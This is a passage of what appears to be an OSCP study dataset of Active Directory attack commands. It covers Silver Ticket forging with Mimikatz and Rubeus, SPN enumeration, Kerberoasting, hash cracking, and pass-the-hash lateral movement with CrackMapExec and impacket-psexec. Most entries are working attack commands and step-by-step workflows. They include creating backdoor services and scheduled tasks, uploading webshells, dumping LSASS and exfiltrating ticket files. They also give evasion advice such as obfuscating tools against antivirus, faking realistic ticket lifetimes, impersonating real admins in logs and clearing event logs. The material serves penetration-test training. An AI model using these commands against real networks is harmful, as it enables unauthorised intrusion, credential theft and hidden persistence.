Use service access to compromise additional accounts, escalate privileges
4.

Exfiltrate data:
Copy sensitive files, dump databases, enumerate shares
5.

Cover tracks:
klist purge (remove ticket from cache), clear event logs (if OPSEC matters)

PERSISTENCE USE CASE:
Silver tickets excel at PERSISTENCE because:
- Valid for 10 years (default) - Long-term access
- No password change detection - Even if service account password changes, cached ticket still works until service restarts (Windows doesn't re-validate cached tickets)
- No DC communication - Ticket works offline, survives DC reboots
- Service-level only - Harder to detect than domain-wide Golden ticket

PERSISTENCE WORKFLOW:
1.

Obtain service account hash during initial compromise
2.

Forge Silver ticket, save to .kirbi file (omit /ptt)
3.

Exfiltrate .kirbi file off target network
4.

Return weeks/months later, inject ticket:
kerberos::ptt <ticket.kirbi>
5.

Access service transparently

LIMITATION:
Ticket becomes invalid if:
- Service account is deleted (rare)
- Service account password changes AND service process restarts (clears cached encryption keys)
- Kerberos policy enforces ticket lifetime limits (Group Policy override, uncommon)

FINAL OSCP EXAM TIPS:
1.

Practice ticket creation 10+ times before exam (muscle memory for syntax)
2.

Keep Domain SID in notes (you'll use it multiple times)
3.

Enumerate all SPNs early (setspn -T <domain> -Q */*), prioritize high-value services (SQL, IIS, file shares)
4.

Crack Kerberoast hashes DURING enumeration phase (run Hashcat in background while doing other tasks)
5.

If Mimikatz blocked by AV, use Rubeus (often bypasses signature-based detection)
6.

Test ticket with klist BEFORE attempting service access (saves time troubleshooting)
7.

Document which tickets you've created (easy to lose track with multiple targets)

REFERENCES AND FURTHER LEARNING:
- Mimikatz Kerberos module:
https://github.com/gentilkiwi/mimikatz/wiki/module~kerberos
- Rubeus Silver Ticket:
https://github.com/GhostPack/Rubeus#silver
- Sean Metcalf's Silver Ticket research:
https://adsecurity.org/?p=2011
- Kerberos RFC 4120:
https://www.rfc-editor.org/rfc/rfc4120 (protocol specification)
- MITRE ATT&CK T1558.002:
https://attack.mitre.org/techniques/T1558/002/ (Silver Ticket technique)

This technique is a cornerstone of OSCP Active Directory exploitation.

Master it thoroughly.","high"
"ad-silver-ticket-rubeus-create","Create Silver Ticket with Rubeus","active-directory","Rubeus.exe silver /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:<SPN_SERVICE> /rc4:<SERVICE_ACCOUNT_NTLM> /user:<IMPERSONATED_USER> /ptt","Forge a Kerberos service ticket (TGS) using Rubeus, a modern C# alternative to Mimikatz. Supports AES encryption and better OPSEC with cleaner output and fewer detection signatures.","kerberos-attacks","RUBEUS VS MIMIKATZ - WHY USE RUBEUS FOR SILVER TICKETS:
✅ RUBEUS ADVANTAGES:
1.

BETTER OPSEC:
Supports AES256/AES128 encryption (modern standard), RC4 is legacy and suspicious
2.

ACTIVE DEVELOPMENT:
Mimikatz Kerberos module is stable but rarely updated, Rubeus is actively maintained by SpecterOps
3.

CLEANER OUTPUT:
Rubeus shows detailed ticket construction steps (helpful for troubleshooting), base64 output for easy transfer
4.

BATCH OPERATIONS:
Create multiple tickets in one command (/service:cifs,http,mssql)
5.

BETTER ERROR HANDLING:
Rubeus validates parameters and shows detailed error messages (Mimikatz often fails silently)
6.

NO DRIVER NEEDED:
Mimikatz sometimes requires kernel driver for certain operations, Rubeus is pure userland
7.

C2 INTEGRATION:
Rubeus compiles to .NET assembly, easily integrated with Cobalt Strike (execute-assembly), Covenant, etc.

❌ RUBEUS DISADVANTAGES:
1.

REQUIRES .NET:
Needs .NET Framework 4.5+ (most Windows 10/Server 2016+ have this, older systems may not)
2.

LARGER BINARY:
Rubeus.exe is ~200KB, Mimikatz is ~1.2MB (both detectable, but size matters for upload)
3.

MORE AV SIGNATURES:
Rubeus is popular in penetration testing, many AVs signature-detect it (obfuscation needed)
4.

LESS VERSATILE:
Mimikatz does MANY things (LSASS dump, DCSync, ticket forging, password spraying), Rubeus ONLY does Kerberos attacks

🎯 OSCP RECOMMENDATION:
- LEARN BOTH:
Mimikatz for exam (more versatile, covers more techniques)
- PREFER RUBEUS:
For Silver/Golden tickets specifically (better OPSEC, easier syntax)
- FALLBACK:
If one is detected/blocked, use the other

RUBEUS WORKFLOW FOR OSCP EXAM:
1.

ENUMERATION (Kerberoasting):
   Rubeus.exe kerberoast /outfile:hashes.txt
   - Obtains TGS-REP for all SPNs
   - Outputs Hashcat-compatible format (mode 13100)

2.

CRACK HASHES (offline):
   hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
   - Retrieves plaintext password OR continue with hash

3.

CONVERT PASSWORD TO NTLM (if you cracked plaintext):
   Rubeus.exe hash /password:cracked_password
   - Outputs NTLM, AES128, AES256 keys

4.

FORGE SILVER TICKET:
   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /ptt
   - Creates and injects ticket

5.

VALIDATE AND ACCESS:
   Rubeus.exe klist
   iwr http://web04.corp.com
   - Confirm ticket exists, test service access

6.

PERSISTENCE (save ticket for later):
   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /nowrap /outfile:ticket.kirbi
   - Saves base64 ticket to file
   - Exfiltrate ticket off network
   - Re-inject later:
Rubeus.exe ptt /ticket:<base64>

RUBEUS COMMAND VARIATIONS:
# Create Silver ticket with AES256 (better OPSEC):
Rubeus.exe silver /aes256:<64_hex_chars> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /ptt

# Create multiple tickets for same server:
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:cifs,http /user:admin /ptt

# Create ticket with custom groups (fine-tuned permissions):
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /groups:512,519 /ptt
(512=Domain Admins, 519=Enterprise Admins)

# Create ticket and output base64 for transfer:
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /nowrap

# Create ticket with specific lifetime (OPSEC):
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /endoflife:20251231235959 /ptt
(Format:
YYYYMMDDHHmmss, sets realistic expiration instead of 10 years)

RUBEUS OPSEC ENHANCEMENTS:
1.

USE AES INSTEAD OF RC4:
   - RC4 (NTLM hash) is legacy, flagged by EDR
   - AES256 is modern standard, blends with normal traffic
   - Obtain AES keys via DCSync or Kerberoasting with /enctype:aes256

2.

SET REALISTIC TICKET LIFETIME:
   - Default 10-year tickets are obvious forgeries
   - Use /endoflife:YYYYMMDDHHmmss to match normal ticket lifetimes (8-24 hours)
   - Check domain policy:
Get-DomainPolicy | Select -ExpandProperty KerberosPolicy (MaxTicketAge)

3.

IMPERSONATE REAL USERS:
   - Using fictional usernames (e.g., /user:fakeadmin) is suspicious
   - Enumerate real domain admins:
Get-NetGroupMember -Identity 'Domain Admins'
   - Use real admin username for /user parameter (appears legitimate in logs)

4.

MATCH GROUP MEMBERSHIPS:
   - Default PAC sets every user as Domain Admin (unrealistic)
   - Enumerate target user's actual groups:
Get-NetUser -Identity <user> | Select -ExpandProperty memberof
   - Set custom groups with /groups:<RID1>,<RID2> to match real user

5.

OBFUSCATE RUBEUS BINARY:
   - Rubeus is heavily signatured by AV
   - Use ConfuserEx to obfuscate .NET assembly
   - OR compile from source with renamed classes/namespaces
   - OR use in-memory loading (Invoke-ReflectivePEInjection, execute-assembly in C2)

COMMON RUBEUS FLAGS REFERENCE:
/domain - Target domain FQDN
/sid - Domain SID (S-1-5-21-XXX-XXX-XXX)
/target - Server FQDN where SPN runs
/service - SPN type (cifs, http, mssql, ldap, host, etc.)
/rc4 - NTLM hash (32 hex chars)
/aes256 - AES256 key (64 hex chars, RECOMMENDED)
/aes128 - AES128 key (32 hex chars)
/user - Impersonated username
/groups - Custom group RIDs (comma-separated, default:
512,513,518,519,520)
/ptt - Pass-the-Ticket (inject into current session)
/outfile - Save ticket to .kirbi file
/nowrap - Output base64 without wrapping (for copy/paste)
/endoflife - Ticket expiration (YYYYMMDDHHmmss format)
/dc - Specify DC for validation (usually not needed for Silver tickets)

TIME ESTIMATES (Rubeus vs Mimikatz):
- Rubeus ticket creation:
<1 minute (same as Mimikatz)
- Rubeus with AES:
+30 seconds (if you need to obtain AES keys first via DCSync)
- Rubeus batch tickets:
<1 minute (creates multiple tickets, faster than multiple Mimikatz commands)
- Rubeus obfuscation:
+5-10 minutes first time (ConfuserEx), reuse obfuscated binary later

OSCP EXAM INTEGRATION:
✅ When to use Rubeus:
- Modern Windows targets (10/Server 2016+) with .NET 4.5+
- Need AES encryption for stealth (exam may have ""realistic"" monitoring)
- Multiple SPNs on same server (batch ticket creation)
- C2 framework available (execute-assembly integration)

✅ When to use Mimikatz:
- Older Windows targets (7/Server 2008) without recent .NET
- Need OTHER Mimikatz capabilities (LSASS dump, DCSync) in same session
- Rubeus is detected/blocked and obfuscation failed
- Familiar with Mimikatz syntax (faster execution under time pressure)

FINAL RECOMMENDATION FOR OSCP:
PRACTICE BOTH tools before exam:
1.

Memorize Mimikatz kerberos::golden syntax (versatile, works everywhere)
2.

Learn Rubeus silver syntax (better OPSEC, cleaner output)
3.

During exam:
Try Rubeus FIRST (if .NET available), fallback to Mimikatz if detected
4.

For documentation:
Mention BOTH tools (shows depth of knowledge)

Rubeus is the MODERN choice for Kerberos attacks, but Mimikatz remains the SWISS ARMY KNIFE for AD exploitation.

Know both.","high"
"ad-enumerate-spn-target","Enumerate SPNs for Target Server","enumeration","setspn -Q */<TARGET_SERVER>*","Query Active Directory for all Service Principal Names (SPNs) registered to a specific server. Essential prerequisite for Silver ticket attacks to identify available services and their types.","kerberos-enumeration","OSCP METHODOLOGY - WHY SPN ENUMERATION IS CRITICAL FOR SILVER TICKETS:
Silver ticket attacks require THREE pieces of information:
1.

Domain SID (extract with whoami /user)
2.

Service account NTLM hash (obtain via Kerberoasting, LSASS dump, or DCSync)
3.

TARGET SPN - THIS IS WHAT THIS COMMAND PROVIDES

WITHOUT accurate SPN information, your Silver ticket will FAIL with errors like:
- 'Server not found in Kerberos database' (hostname mismatch)
- 'Access denied' (wrong service type)
- 'KRB_AP_ERR_NOT_US' (service/hostname doesn't match SPN registration)

setspn IS THE AUTHORITATIVE SOURCE for SPN information in Active Directory.

It queries the actual SPN registrations, not assumptions.

COMMON OSCP WORKFLOW:
1.

ENUMERATE TARGET SERVER (you know hostname, e.g., WEB04):
   setspn -Q */web04*
   OUTPUT EXAMPLE:
   Existing SPN found:
   http/web04.corp.com
   Registered to:
CORP\iis_service

2.

RECORD SPN DETAILS:
   - Service type:
http
   - Hostname:
web04.corp.com (use EXACT format from output)
   - Service account:
iis_service

3.

KERBEROAST SERVICE ACCOUNT (to get NTLM hash):
   impacket-GetUserSPNs corp.com/jeff:password -request-user iis_service
   Crack TGS-REP with Hashcat to get NTLM hash

4.

CREATE SILVER TICKET:
   mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt
   (Use EXACT /target value from setspn output)

5.

VALIDATE ACCESS:
   iwr http://web04.corp.com
   (Access works because service type and hostname match SPN registration)

SPN SERVICE TYPES - OSCP RELEVANCE:
HIGH-VALUE SPNs FOR LATERAL MOVEMENT:
1.

cifs (File Shares, SMB):
   - Access:
dir \\server\C$, copy files, remote admin
   - Prevalence:
Nearly every Windows server (auto-registered)
   - OSCP usage:
Most common Silver ticket target (file access, PsExec, lateral movement)

2.

http (IIS, Web Applications):
   - Access:
Web admin panels, upload webshells, REST APIs
   - Prevalence:
Web servers, SharePoint, Exchange OWA
   - OSCP usage:
Upload reverse shell to restricted admin interface, access web-based management

3.

mssql (SQL Server):
   - Access:
Database queries, xp_cmdshell RCE, linked servers
   - Prevalence:
SQL Servers (duh)
   - OSCP usage:
Enable xp_cmdshell, execute OS commands, pivot to linked servers

4.

host (Generic Host Services):
   - Access:
WMI, RPC, scheduled tasks, service creation
   - Prevalence:
All domain-joined computers (auto-registered)
   - OSCP usage:
Remote service creation, scheduled task execution, WMI code execution

5.

ldap (Directory Services):
   - Access:
LDAP queries, directory modifications, DCSync (if permissions exist)
   - Prevalence:
Domain controllers only
   - OSCP usage:
Rare for Silver (use Golden instead), specific LDAP exploits

6.

wsman (Windows Remote Management):
   - Access:
PowerShell remoting (Enter-PSSession, Invoke-Command)
   - Prevalence:
Servers with WinRM enabled (port 5985/5986)
   - OSCP usage:
Remote PowerShell execution, pivot without SMB (stealthier)

LOW-VALUE SPNs (less common in OSCP):
- rpcss (RPC Endpoint Mapper) - Covered by host/
- oracle, ftp, smtp, etc.

- Specific services, rare in OSCP exam

MANUAL ALTERNATIVE (if setspn unavailable):
PowerView (PowerShell):
```powershell
Get-NetUser -SPN | Where {$_.serviceprincipalname -match 'web04'} | Select serviceprincipalname
```
ADVANTAGES:
Faster, filterable, shows additional properties (pwdlastset, admin count)

LDAP query (raw):
```powershell
([adsisearcher]""(serviceprincipalname=*/web04*)"").FindAll() | ForEach-Object { $_.Properties.serviceprincipalname }
```
ADVANTAGES:
No external tools needed, pure PowerShell

impacket-GetUserSPNs (Linux):
```bash
impacket-GetUserSPNs corp.com/jeff:password -request
```
LIMITATION:
Only shows SPNs for USER ACCOUNTS (not computer accounts), but that's often what you want for Kerberoasting anyway

TIME ESTIMATES:
- setspn -Q for single server:
<5 seconds
- setspn -Q for all SPNs in domain:
30-60 seconds (large domains)
- PowerView Get-NetUser -SPN:
<10 seconds (faster than setspn for full dump)
- impacket-GetUserSPNs:
5-10 seconds (network latency, LDAP query)

OSCP EXAM TIPS:
1.

ENUMERATE SPNs EARLY in the engagement (during AD enumeration phase)
2.

CREATE A TARGET LIST of high-value SPNs:
   - SQL servers (mssql) - potential xp_cmdshell RCE
   - Web servers (http) - potential webshell upload
   - File servers (cifs) - data exfiltration, lateral movement
3.

PRIORITIZE SPNs associated with USER ACCOUNTS (crackable) over computer accounts
4.

DOCUMENT EXACT HOSTNAMES from setspn output (copy/paste into notes for Silver ticket creation later)
5.

CROSS-REFERENCE with service account enumeration:
   setspn -Q */web04* → Registered to:
CORP\iis_service
   Then:
Get-NetUser -Identity iis_service → Check pwdlastset, memberof, admincount
6.

IF SETSPN IS BLOCKED (rare), fallback to PowerView or impacket

COMBINING WITH KERBEROASTING WORKFLOW:
# Step 1:
Enumerate ALL SPNs associated with user accounts (Kerberoasting targets)
impacket-GetUserSPNs corp.com/jeff:password -request -outputfile tgs.txt

# Step 2:
Crack TGS-REP hashes (offline)
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule
# Result:
iis_service:Password123

# Step 3:
Identify SPNs for compromised service account
setspn -Q */iis_service* OR setspn -L iis_service
# Result:
http/web04.corp.com registered to iis_service

# Step 4:
Create Silver ticket for identified SPN
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm_hash_of_Password123> /user:admin /ptt

# Step 5:
Access service
iwr http://web04.corp.com

SPN ENUMERATION FOR PERSISTENCE:
If you've compromised a service account (via Kerberoasting or LSASS dump), enumerate ALL SPNs associated with that account:
setspn -L iis_service

RESULT EXAMPLE:
Registered ServicePrincipalNames for CN=IIS Service,CN=Users,DC=corp,DC=com:
    http/web04.corp.com
    http/web05.corp.com
    http/intranet.corp.com

IMPLICATION:
Single service account hash gives you Silver ticket access to MULTIPLE servers (web04, web05, intranet).

Create tickets for all of them:
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web05.corp.com /service:http /rc4:<hash> /user:admin /ptt
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:intranet.corp.com /service:http /rc4:<hash> /user:admin /ptt

THIS IS A FORCE MULTIPLIER - One compromised service account can grant access to dozens of services.

CROSS-REFERENCE WITH OTHER ENUMERATION:
- Combine with session enumeration:
Get-NetSession -ComputerName web04 (who's logged on?)
- Combine with privilege enumeration:
Get-NetLocalGroupMember -ComputerName web04 -GroupName Administrators (who can admin this server?)
- Combine with share enumeration:
Find-DomainShare -CheckShareAccess -ComputerName web04 (what's accessible?)

This gives you CONTEXT:
Not just ""web04 has http SPN"", but ""web04 has http SPN, iis_service account runs it, domain admin 'jeff' has active session, C$ share is accessible"".

This informs your attack path.

FINAL OSCP EXAM INTEGRATION:
setspn IS THE BRIDGE between Kerberoasting (obtaining service account hashes) and Silver tickets (using those hashes for lateral movement).

Without accurate SPN enumeration, you can't create working Silver tickets.

This command is NOT optional - it's MANDATORY for Silver ticket attacks.

PRACTICE UNTIL YOU CAN:
1.

Run setspn -Q */target* from memory
2.

Parse SPN format (extract service type and hostname)
3.

Cross-reference with service account (setspn -L <account>)
4.

Feed SPN data into Silver ticket creation (exact /target and /service values)
5.

Troubleshoot mismatches (hostname format, service type errors)

You'll use this command 5-10 times per OSCP exam (once per target server for Silver ticket prep).","high"
"ad-silver-ticket-validate-access","Validate Silver Ticket Access to Service","active-directory","# CIFS/SMB: dir \\<TARGET_SERVER>\C$
# HTTP/IIS: Invoke-WebRequest http://<TARGET_SERVER> -UseDefaultCredentials
# MSSQL: Invoke-Sqlcmd -ServerInstance <TARGET_SERVER> -Query 'SELECT @@VERSION'
# LDAP: ldapsearch -H ldap://<TARGET_SERVER> -Y GSSAPI -b 'DC=corp,DC=com'","Test service access after Silver ticket injection to validate the forged ticket grants expected permissions. Different validation methods for different SPN service types.","kerberos-attacks","OSCP METHODOLOGY - VALIDATION IS MANDATORY:
After creating a Silver ticket, you MUST validate access BEFORE considering the attack successful.

Validation confirms:
1.

Ticket was constructed correctly (right hash, SID, service type)
2.

Ticket was injected properly (appears in klist AND is being used by applications)
3.

Service accepts the ticket (grants expected permissions)

Skipping validation wastes time during the exam - you may think you have access but actually don't, leading to failed exploitation attempts later.

VALIDATION WORKFLOW (30 seconds total):
1.

CREATE SILVER TICKET:
   mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt

2.

VERIFY TICKET IN CACHE (5 seconds):
   klist
   Expected output:
   Server:
http/web04.corp.com @ CORP.COM
   KerbTicket Encryption Type:
RSADSI RC4-HMAC(NT)

3.

VALIDATE SERVICE ACCESS (10-15 seconds, depending on service type):
   
   FOR HTTP SPN:
   Invoke-WebRequest http://web04.corp.com -UseDefaultCredentials
   SUCCESS:
StatusCode = 200, Content populated
   FAILURE:
401/403 status, or credential prompt

   FOR CIFS SPN:
   dir \\web04.corp.com\C$
   SUCCESS:
Directory listing of C:\ drive
   FAILURE:
Access denied, logon failure

   FOR MSSQL SPN:
   Invoke-Sqlcmd -ServerInstance web04.corp.com -Query 'SELECT @@VERSION'
   SUCCESS:
SQL version string returned
   FAILURE:
Login failed, server not found

4.

DOCUMENT SUCCESS:
   - Record which services are accessible
   - Note any failures for troubleshooting
   - Proceed with exploitation (webshell upload, file exfiltration, xp_cmdshell, etc.)

SERVICE-SPECIFIC VALIDATION COMMANDS:
1.

CIFS / FILE SHARES (most common):
   # List administrative shares:
   net view \\<server> /all
   
   # Access specific share:
   dir \\<server>\C$
   dir \\<server>\ADMIN$
   
   # Copy file (test write access):
   echo test > \\<server>\C$\test.txt
   
   # PowerShell alternatives:
   Get-ChildItem \\<server>\C$
   Test-Path \\<server>\C$\Windows (verify path exists)
   
   EXPECTED RESULT:
Full directory listings, file operations succeed
   TROUBLESHOOTING:
If access denied, verify cifs ticket exists (klist | findstr cifs)

2.

HTTP / IIS WEB SERVERS:
   # PowerShell web request:
   Invoke-WebRequest http://<server> -UseDefaultCredentials
   
   # Test specific path:
   Invoke-WebRequest http://<server>/admin -UseDefaultCredentials
   
   # Download file:
   Invoke-WebRequest http://<server>/data.xml -OutFile data.xml -UseDefaultCredentials
   
   # curl alternative (if PowerShell restricted):
   curl --negotiate -u :
http://<server>
   
   EXPECTED RESULT:
HTTP 200, content retrieved, no auth prompts
   TROUBLESHOOTING:
If 401/403, ensure FQDN in URL and http ticket in cache

3.

MSSQL / SQL SERVER:
   # PowerShell (requires SqlServer module):
   Import-Module SqlServer
   Invoke-Sqlcmd -ServerInstance <server> -Query 'SELECT @@VERSION'
   
   # Test xp_cmdshell (if enabled):
   Invoke-Sqlcmd -ServerInstance <server> -Query 'EXEC xp_cmdshell ""whoami""'
   
   # List databases:
   Invoke-Sqlcmd -ServerInstance <server> -Query 'SELECT name FROM sys.databases'
   
   # sqlcmd.exe alternative (cmd-line tool):
   sqlcmd -S <server> -Q ""SELECT @@VERSION""
   
   EXPECTED RESULT:
Query results returned, no login failures
   TROUBLESHOOTING:
If login failed, verify mssql ticket and SQL user mapping

4.

LDAP / DOMAIN CONTROLLERS:
   # PowerShell AD cmdlets (automatically use cached ticket):
   Get-ADUser -Server <server> -Filter *
   Get-ADComputer -Server <server> -Filter *
   
   # LDAP query:
   ([adsisearcher]""(&(objectCategory=person)(objectClass=user))"").FindAll()
   
   # Linux ldapsearch:
   ldapsearch -H ldap://<server> -Y GSSAPI -b 'DC=corp,DC=com' '(objectClass=*)'
   
   EXPECTED RESULT:
AD objects returned, no credential errors
   TROUBLESHOOTING:
Rare for Silver tickets (use Golden for DC access), verify ldap ticket

5.

HOST / GENERIC SERVICES:
   # WMI query (tests RPC access):
   Get-WmiObject -Class Win32_OperatingSystem -ComputerName <server>
   
   # Create scheduled task (tests remote admin):
   schtasks /create /tn test /tr calc.exe /sc once /st 23:00 /S <server>
   
   # Remote service enumeration:
   Get-Service -ComputerName <server>
   
   EXPECTED RESULT:
WMI data returned, tasks created, services listed
   TROUBLESHOOTING:
Host ticket is broad (covers multiple protocols), check specific errors

6.

WSMAN / POWERSHELL REMOTING:
   # Enter remote PS session:
   Enter-PSSession -ComputerName <server>
   
   # Execute remote command:
   Invoke-Command -ComputerName <server> -ScriptBlock { whoami }
   
   # Test WinRM connectivity:
   Test-WSMan <server>
   
   EXPECTED RESULT:
Remote session established, commands execute
   TROUBLESHOOTING:
Verify wsman ticket, check WinRM enabled on target (port 5985/5986)

COMMON VALIDATION MISTAKES:
1.

❌ Using NetBIOS name instead of FQDN:
   WRONG:
dir \\WEB04\C$ (triggers NTLM, ignores Kerberos ticket)
   RIGHT:
dir \\WEB04.corp.com\C$ (triggers Kerberos, uses ticket)

2.

❌ Omitting -UseDefaultCredentials for HTTP:
   WRONG:
Invoke-WebRequest http://web04.corp.com (may not use ticket)
   RIGHT:
Invoke-WebRequest http://web04.corp.com -UseDefaultCredentials (forces ticket use)

3.

❌ Testing wrong service type:
   WRONG:
Created http ticket, testing SMB access (dir \\server\C$)
   RIGHT:
Created http ticket, testing HTTP access (Invoke-WebRequest http://server)

4.

❌ Not checking klist first:
   WRONG:
Assume ticket injection worked, proceed to validation (wastes time if injection failed)
   RIGHT:
Run klist BEFORE validation (confirms ticket exists and is correct type)

5.

❌ Giving up after first failure:
   WRONG:
Access denied → assume Silver ticket doesn't work
   RIGHT:
Troubleshoot systematically (check service type, hostname format, hash validity, SID correctness)

TROUBLESHOOTING DECISION TREE:
VALIDATION FAILED?
├─ Ticket not in klist?
│  ├─ /ptt failed → Re-run Mimikatz with privilege::debug first
│  └─ Ticket creation failed → Check syntax, required parameters
│
├─ Ticket in klist but access denied?
│  ├─ Check service type match (cifs ticket for SMB, http ticket for web, etc.)
│  ├─ Verify hostname format (FQDN required for Kerberos)
│  ├─ Test hash validity (crackmapexec smb <dc> -u <account> -H <hash>)
│  └─ Verify Domain SID correctness (whoami /user, remove RID)
│
├─ Credential prompt appears?
│  ├─ Application not using Kerberos → Use FQDN, add -UseDefaultCredentials
│  ├─ Service prefers NTLM → Check SPN registration (setspn -Q)
│  └─ Hostname format wrong → Match ticket hostname exactly
│
└─ Specific error codes?
   ├─ KRB_AP_ERR_MODIFIED → Wrong hash or Domain SID
   ├─ KRB_AP_ERR_NOT_US → Domain mismatch or wrong target hostname
   ├─ Server not found → Hostname typo or DNS resolution failure
   └─ PAC validation error → Service has PAC validation enabled (Silver won't work)

POST-VALIDATION NEXT STEPS:
Once validation succeeds, proceed with exploitation:
1.

CIFS ACCESS:
   - Copy payload:
copy beacon.exe \\server\C$\Windows\Temp\
   - PsExec:
psexec.exe \\server cmd.exe
   - Create service:
sc \\server create backdoor binpath= ""C:\Windows\Temp\beacon.exe""
   - Scheduled task:
schtasks /create /tn backdoor /tr ""C:\Windows\Temp\beacon.exe"" /sc onstart /S server

2.

HTTP ACCESS:
   - Upload webshell:
Invoke-WebRequest -Uri http://server/upload -Method POST -InFile shell.aspx -UseDefaultCredentials
   - Access admin panel:
http://server/admin (use ticket for auth)
   - Exploit web vuln:
Use ticket to bypass auth, then exploit SQLi/RCE/LFI

3.

MSSQL ACCESS:
   - Enable xp_cmdshell:
Invoke-Sqlcmd -Query ""EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE""
   - Execute commands:
Invoke-Sqlcmd -Query ""EXEC xp_cmdshell 'whoami'""
   - Escalate to SYSTEM:
xp_cmdshell runs as SQL Server service account (often high-privilege)

4.

LDAP ACCESS (rare for Silver, common for Golden):
   - Enumerate AD:
Get-ADUser -Filter * -Server <dc>
   - Modify AD objects (if permissions allow):
Set-ADUser, Add-ADGroupMember
   - DCSync:
mimikatz # lsadump::dcsync /domain:corp.com /all (requires Replication rights)

TIME BUDGET FOR OSCP EXAM:
- Ticket creation:
1 minute
- klist verification:
5 seconds
- Service validation:
10-30 seconds (depending on service type)
- Troubleshooting (if needed):
2-5 minutes (systematic approach)
- TOTAL:
3-7 minutes from ticket creation to confirmed access

If validation takes longer than 7 minutes, consider alternative attack paths (Pass-the-Hash, legitimate credentials, different vulnerability).

FINAL OSCP EXAM TIP:
CREATE A VALIDATION CHECKLIST:
1.

[ ] klist shows ticket for correct service type (Server:
<service>/<target>)
2.

[ ] Ticket encryption type is RC4-HMAC(NT) or AES (depending on /rc4 or /aes256)
3.

[ ] FQDN used in validation command (not NetBIOS name)
4.

[ ] Service-specific validation command executed (dir for cifs, iwr for http, etc.)
5.

[ ] SUCCESS:
Access granted without credential prompt
6.

[ ] FAILURE:
Troubleshoot systematically (service type, hostname, hash, SID)

This checklist prevents common mistakes and ensures thorough validation before proceeding with exploitation.","high"
"ad-pass-the-hash-crackmapexec","Pass-the-Hash with CrackMapExec (Spray Multiple Targets)","post-exploit","crackmapexec smb <TARGET_RANGE> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN>","Test NTLM hash against multiple targets simultaneously to identify where the user has administrative access. Shows 'Pwn3d!' for systems where hash grants admin rights. FASTEST method for lateral movement discovery.","active-directory","CrackMapExec is ESSENTIAL for OSCP lateral movement. The 'Pwn3d!' indicator is your green light for command execution. WORKFLOW: (1) DCSync/dump hashes, (2) Spray with CME to find admin access, (3) Execute commands on 'Pwn3d!' systems with psexec/wmiexec, (4) Dump LSASS for more creds, (5) Repeat. Time estimate: 5-30 seconds for /24 subnet spray.

COMMON MISTAKES:
- Using full hash output with colons (use only NTLM portion: 32 hex chars)
- Including domain prefix in username (use -d flag separately)
- Not documenting 'Pwn3d!' systems (you'll forget which hosts grant access)
- Assuming [-] means failure (could be non-admin auth, still valuable for enumeration)

ADVANCED USAGE:
Command execution: crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'whoami'
Module usage: crackmapexec smb <TARGET> -u <USER> -H <HASH> -M lsassy (dump LSASS)
Database: crackmapexec smb <TARGET> -u <USER> -H <HASH> --log (stores in CME database)

TIME ESTIMATE: 10-60 seconds for /24 subnet (parallelized), 2-5 seconds per single host","high"
"ad-pass-the-hash-impacket-psexec","Pass-the-Hash with Impacket PsExec (Remote Shell)","post-exploit","impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>","Execute commands or spawn interactive shell on remote Windows system using Pass-the-Hash. Uploads binary to ADMIN$ share and creates Windows service for execution. Grants SYSTEM-level access (highest privilege).","active-directory","Impacket-psexec is the PRIMARY lateral movement tool after obtaining NTLM hashes. ADVANTAGES: (1) No password needed (hash-only authentication), (2) Grants SYSTEM privileges (higher than user's normal rights), (3) Works from Kali without Windows access. DISADVANTAGES: (1) Writes binary to disk (AV may detect), (2) Creates Windows service (logged in Event ID 7045), (3) Requires ADMIN$ write access.

OSCP WORKFLOW:
1. DCSync or dump hashes: impacket-secretsdump '<DOMAIN>/<DA>:<PASS>@<DC>'
2. Test hash validity: crackmapexec smb <TARGET> -u <USER> -H <HASH> (look for 'Pwn3d!')
3. Spawn shell: impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>
4. Dump LSASS: procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
5. Download dump: download C:\Users\Public\lsass.dmp /tmp/lsass.dmp
6. Parse locally: pypykatz lsa minidump /tmp/lsass.dmp
7. Repeat with new credentials

STEALTH ALTERNATIVES:
- impacket-wmiexec: Uses WMI for execution (no service creation, stealthier)
- impacket-smbexec: Writes to C$ or other writable share (not ADMIN$)
- impacket-atexec: Uses Task Scheduler (less common IOC)

COMMON MISTAKES:
- Forgetting colon before NTLM hash in -hashes flag (correct: -hashes :HASH)
- Using IP when Kerberos required (use FQDN for Kerberos: CLIENT75.corp.com)
- Not checking 'Pwn3d!' status first (wastes time on failed connections)
- Using on domain controller (use wmiexec instead - less IOCs)

TIME ESTIMATE: 5-15 seconds for connection establishment, instant shell thereafter","high"
